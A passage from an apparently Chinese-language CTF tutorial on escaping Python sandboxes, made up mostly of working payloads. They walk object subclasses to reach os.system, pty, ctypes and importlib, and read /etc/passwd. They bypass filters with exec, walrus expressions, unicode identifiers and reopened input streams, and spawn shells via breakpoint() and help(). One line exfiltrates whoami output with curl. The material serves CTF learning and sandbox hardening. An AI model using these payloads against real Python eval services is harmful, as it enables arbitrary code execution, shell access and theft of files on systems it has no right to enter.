class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;_sitebuiltins.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&quot;_Helper&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#commands (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;commands&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;commands&quot;</span>].getoutput(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pty (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pty&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pty&quot;</span>].spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#importlib</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#imp</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pdb</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pdb&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pdb&quot;</span>].os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ctypes</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># multiprocessing</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;multiprocessing&#x27;</span>).Process(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;curl localhost:9999/?a=`whoami`&#x27;</span>)).start()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>常见的一些 File payload 如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">操作文件可以使用 builtins 中的 <span class="built_in">open</span>，也可以使用 FileLoader 模块的 get_data 方法。</span><br><span class="line"></span><br><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;FileLoader&quot;</span> ][<span class="number">0</span>].get_data(<span class="number">0</span>,<span class="string">&quot;/etc/passwd&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="绕过多行限制">绕过多行限制</h4>
<p>绕过多行限制的利用手法通常在限制了单行代码的情况下使用,例如 eval, 中间如果存在；或者换行会报错。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;);print(1)&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; Traceback (most recent call last):</span><br><span class="line">&gt;&gt;&gt; File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line 1, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">&gt;&gt;&gt; File <span class="string">&quot;&lt;string&gt;&quot;</span>, line 1</span><br><span class="line">&gt;&gt;&gt; __import__(<span class="string">&#x27;os&#x27;</span>);<span class="built_in">print</span>(1)</span><br><span class="line">&gt;&gt;&gt; 1</span><br><span class="line">&gt;&gt;&gt; 2</span><br><span class="line">&gt;&gt;&gt; 3</span><br><span class="line">&gt;&gt;&gt; 4</span><br><span class="line">&gt;&gt;&gt; 5</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">exec</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 可以支持换行符与;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="built_in">eval</span>(<span class="string">&quot;exec(&#x27;__import__(\&quot;os\&quot;)\\nprint(1)&#x27;)&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; 1</span><br><span class="line">&gt;&gt;&gt; 1</span><br><span class="line">&gt;&gt;&gt; 2</span><br><span class="line">&gt;&gt;&gt; compile</span><br><span class="line"></span><br><span class="line">compile 在 single 模式下也同样可以使用 \n 进行换行, 在 <span class="built_in">exec</span> 模式下可以直接执行多行代码.</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;eval(compile(&#x27;</span><span class="built_in">print</span>(<span class="string">&quot;hello world&quot;</span>); <span class="built_in">print</span>(<span class="string">&quot;heyy&quot;</span>)<span class="string">&#x27;, &#x27;</span>&lt;stdin&gt;<span class="string">&#x27;, &#x27;</span><span class="built_in">exec</span><span class="string">&#x27;))&#x27;</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line">1</span><br><span class="line">海象表达式</span><br><span class="line"></span><br><span class="line">海象表达式是 Python 3.8 引入的一种新的语法特性，用于在表达式中同时进行赋值和比较操作。</span><br><span class="line"></span><br><span class="line">海象表达式的语法形式如下：</span><br><span class="line"></span><br><span class="line">&lt;expression&gt; := &lt;value&gt; <span class="keyword">if</span> &lt;condition&gt; <span class="keyword">else</span> &lt;value&gt;</span><br><span class="line">1</span><br><span class="line">借助海象表达式，我们可以通过列表来替代多行代码：</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="built_in">eval</span>(<span class="string">&#x27;[a:=__import__(&quot;os&quot;),b:=a.system(&quot;id&quot;)]&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt; uid=1000(kali) gid=0(root) <span class="built_in">groups</span>=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(<span class="built_in">sudo</span>),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer)</span><br><span class="line">&gt;&gt;&gt; [&lt;module <span class="string">&#x27;os&#x27;</span> (frozen)&gt;, 0]</span><br><span class="line">&gt;&gt;&gt; 1</span><br><span class="line">&gt;&gt;&gt; 2</span><br><span class="line">&gt;&gt;&gt; 3</span><br><span class="line">&gt;&gt;&gt; 绕过长度限制</span><br><span class="line">&gt;&gt;&gt; BYUCTF_2023 中的几道 jail 题对 payload 的长度作了限制</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>((__import__(&quot;re&quot;).sub(r&#x27;[a-z0-<span class="number">9</span>]&#x27;,&#x27;&#x27;,input(&quot;code &gt; &quot;).lower()))[:130])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="题目限制不能出现数字字母，构造的目标是调用-open-函数进行读取">题目限制不能出现数字字母，构造的目标是调用 open 函数进行读取</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="built_in">bytes</span>([<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">116</span>,<span class="number">120</span>,<span class="number">116</span>])).read())</span><br><span class="line"></span><br><span class="line">函数名比较好绕过，直接使用 unicode。数字也可以使用 <span class="built_in">ord</span> 来获取然后进行相减。我这里选择的是 <span class="built_in">chr</span>(<span class="number">333</span>).</span><br><span class="line"></span><br><span class="line"><span class="comment"># f = 102 = 333-231 = ord(&#x27;ō&#x27;)-ord(&#x27;ç&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a = 108 = 333-225 = ord(&#x27;ō&#x27;)-ord(&#x27;á&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># l = 97 = 333-236 = ord(&#x27;ō&#x27;)-ord(&#x27;ì&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># g = 103 = 333-230 = ord(&#x27;ō&#x27;)-ord(&#x27;æ&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># . = 46 = 333-287 = ord(&#x27;ō&#x27;)-ord(&#x27;ğ&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># t = 116 = 333-217 = ord(&#x27;ō&#x27;)-ord(&#x27;Ù&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># x = 120 = = 333-213 = ord(&#x27;ō&#x27;)-ord(&#x27;Õ&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="built_in">bytes</span>([<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ç&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;á&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ì&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;æ&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ğ&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ù&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Õ&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ù&#x27;</span>)])).read())</span><br></pre></td></tr></table></figure>
<p>但这样的话其实长度超出了限制。而题目的 eval 表示不支持分号 ;。</p>
<p>这种情况下，我们可以添加一个 exec。然后将 ord 以及不变的 a(‘ō’) 进行替换。这样就可以构造一个满足条件的 payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;a=ord;b=a(&#x27;ō&#x27;);print(open(bytes([b-a(&#x27;ç&#x27;),b-a(&#x27;á&#x27;),b-a(&#x27;ì&#x27;),b-a(&#x27;æ&#x27;),b-a(&#x27;ğ&#x27;),b-a(&#x27;Ù&#x27;),b-a(&#x27;Õ&#x27;),b-a(&#x27;Ù&#x27;)])).read())&quot;</span>) </span><br></pre></td></tr></table></figure>
<blockquote>
<p>但其 实尝试之后发现这个 payload 会报错，原因在于其中的某些 unicode 字符遇到 lower() 时会发生变化，避免 lower 产生干扰，可以在选取 unicode 时选择 ord 值更大的字符。例如 chr(4434)</p>
</blockquote>
<p>当然，可以直接使用 input 函数来绕过长度限制。</p>
<p>打开 input 输入</p>
<p>如果沙箱内执行的内容是通过 input 进行传入的话（不是 web 传参），我们其实可以传入一个 input 打开一个新的输入流，然后再输入最终的 payload，这样就可以绕过所有的防护。</p>
<p>以 BYUCTF2023 jail a-z0-9 为例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="built_in">__import__</span>(<span class="string">&quot;re&quot;</span>).sub(<span class="string">r&#x27;[a-z0-9]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">input</span>(<span class="string">&quot;code &gt; &quot;</span>).lower()))[:<span class="number">130</span>]) </span><br></pre></td></tr></table></figure>
<p>即使限制了字母数字以及长度，我们可以直接传入下面的 payload（注意是 unicode）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">𝘦𝘷𝘢𝘭(𝘪𝘯𝘱𝘶𝘵()) </span><br></pre></td></tr></table></figure>
<p>这段 payload 打开 input 输入后，我们再输入最终的 payload 就可以正常执行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>) </span><br></pre></td></tr></table></figure>
<p>打开输入流需要依赖 input 函数，no builtins 的环境中或者题目需要以 http 请求的方式进行输入时，这种方法就无法使用了。</p>
<p>下面是一些<code>打开输入流</code>的方式:</p>
<h4 id="sys-stdin-read">sys.stdin.read()</h4>
<p>注意输入完毕之后按 ctrl+d 结束输入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.read())</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;<span class="number">1</span></span><br><span class="line">&gt;<span class="number">2</span></span><br><span class="line">&gt;<span class="number">3</span></span><br><span class="line">&gt;<span class="number">4</span></span><br><span class="line">&gt;<span class="number">5</span></span><br><span class="line">&gt;sys.stdin.readline()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.readline())</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.stdin.readlines()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.readlines()[<span class="number">0</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>在python <span class="number">2</span>中，<span class="built_in">input</span> 函数从标准输入接收输入之后会自动 <span class="built_in">eval</span> 求值。因此无需在前面加上 <span class="built_in">eval</span>。但 raw_input 不会自动 <span class="built_in">eval</span>。</span><br></pre></td></tr></table></figure>
<h4 id="breakpoint-函数">breakpoint 函数</h4>
<p>pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。</p>
<p>在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()</span><br><span class="line">--Return--</span><br><span class="line">&lt;stdin&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;<span class="literal">None</span></span><br><span class="line">(Pdb) <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">a-z0-<span class="number">9.</span>py  exp2.py  exp.py  flag.txt</span><br><span class="line"><span class="number">0</span></span><br><span class="line">(Pdb) <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">$ ls</span><br><span class="line">a-z0-<span class="number">9.</span>py  exp2.py  exp.py  flag.txt</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="help-函数">help 函数</h4>
<p>help 函数可以打开帮助文档. 索引到 os 模块之后可以打开 sh</p>
<p>当我们输入 help 时，注意要进行 unicode 编码，help 函数会打开帮助（不编码也能打开）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">𝘩𝘦𝘭𝘱() </span><br><span class="line"></span><br><span class="line">然后输入 os,此时会进入 os 的帮助文档。</span><br><span class="line"></span><br><span class="line"><span class="built_in">help</span>&gt; os </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然后再输入 !sh 就可以拿到 /<span class="built_in">bin</span>/sh, 输入 !bash 则可以拿到 /<span class="built_in">bin</span>/bash</span><br><span class="line"></span><br><span class="line"><span class="built_in">help</span>&gt; os</span><br><span class="line">$ ls</span><br><span class="line">a-z0-<span class="number">9.</span>py  exp2.py  exp.py  flag.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="字符串叠加">字符串叠加</h4>
<p>参考[CISCN 2023 初赛]pyshell，通过_不断的进行字符串的叠加，再利用eval()进行一些命令的执行。</p>
<p>我们想执行的代码：<strong>import</strong>(“os”).popen(“tac flag”).read()</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;__import__&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;(&quot;os&quot;).p&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;open(&quot;ta&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;c flag&quot;)&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;.read()&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="变量覆盖与函数篡改">变量覆盖与函数篡改</h4>
<p>在 Python 中，sys 模块提供了许多与 Python 解释器和其环境交互的功能，包括对全局变量和函数的操作。在沙箱中获取 sys 模块就可以达到变量覆盖与函数擦篡改的目的.</p>
<p>sys.modules 存放了现有模块的引用, 通过访问 sys.modules[‘<strong>main</strong>’] 就可以访问当前模块定义的所有函数以及全局变量</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>aaa = <span class="string">&#x27;bbb&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">my_input</span>():</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...     dict_global = <span class="built_in">dict</span>()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...     <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...       <span class="keyword">try</span>:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...       <span class="keyword">except</span> EOFError:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           <span class="built_in">print</span>()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           <span class="keyword">break</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...       <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           <span class="built_in">print</span>(<span class="string">&#x27;bye~~&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           <span class="keyword">continue</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...       <span class="keyword">if</span> input_data == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           <span class="keyword">continue</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...       <span class="keyword">try</span>:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           complie_code = <span class="built_in">compile</span>(input_data, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;single&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...       <span class="keyword">except</span> SyntaxError <span class="keyword">as</span> err:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           <span class="built_in">print</span>(err)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           <span class="keyword">continue</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...       <span class="keyword">try</span>:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           <span class="built_in">exec</span>(complie_code, dict_global)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...       <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...           <span class="built_in">print</span>(err)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>... </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> 